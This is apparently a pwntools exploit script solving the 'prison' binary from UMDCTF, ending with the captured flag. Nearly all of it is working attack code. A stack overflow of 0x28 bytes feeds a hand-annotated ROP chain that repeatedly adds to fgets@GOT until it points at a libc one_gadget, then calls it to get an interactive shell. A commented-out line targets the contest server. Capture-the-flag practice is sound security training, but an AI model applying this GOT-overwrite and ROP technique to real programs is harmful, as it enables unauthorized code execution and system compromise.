from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./prison_patched', '''
    b *(main+37)
    continue
''')

# p = remote('challs.umdctf.io', 31001)

chain = [
    0x400608, 0x601020+0x3d,                                        # pop rbp ; ret                                                                                                                                                 -- rbp=fgets@got+0x3d
    0x4005cf,                                                       # add bl, dh ; ret                                                                                                                                              -- rbx=0x00+0x20=0x20
    0x4005cf,                                                       # add bl, dh ; ret                                                                                                                                              -- rbx=0x20+0x20=0x40
    0x4005cf,                                                       # add bl, dh ; ret                                                                                                                                              -- rbx=0x40+0x20=0x60
    0x400668,                                                       # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret                                                                                        -- fgets@got=_IO_fgets+0x60
    0x400668,                                                       # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret                                                                                        -- fgets@got=_IO_fgets+0x60+0x60
    0x400668,                                                       # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret                                                                                        -- fgets@got=_IO_fgets+0x60+0x60+0x60
    0x400782, 0x601000,                                             # pop rdi ; xor rbx, rbx ; ret                                                                                                                                  -- rdi=0x601000 (anywhere writable)
    0x400560, 0xebce2-0x7f380-0x60*3, 0x601020+0x3d, 0, 0, 0,       # fgets@plt:_IO_fgets+0x60*3 (mov BYTE PTR [rdi], 0x0 ; mov r14, rdi ; jmp 0x7f44c ; pop rbx ; mov rax, r14 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret)      -- rbx=one_gadget-libc_fgets_offset-0x60*3, rbp=fgets@got+0x3d, r12=0, r13=0, r14=0
    0x400668,                                                       # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret                                                                                        -- fgets@got=one_gadget
    0x400560,                                                       # fgets@plt:one_gadget (rbp-0x48 is writable, r13 == NULL, r12 == NULL)
]
payload = b'A'*0x28 + b''.join([p64(c) for c in chain])
p.sendline(payload)

p.interactive() 

# UMDCTF{are_you_sice_man_because_you_were_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_or_are_you_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_because_you_are_sice_man}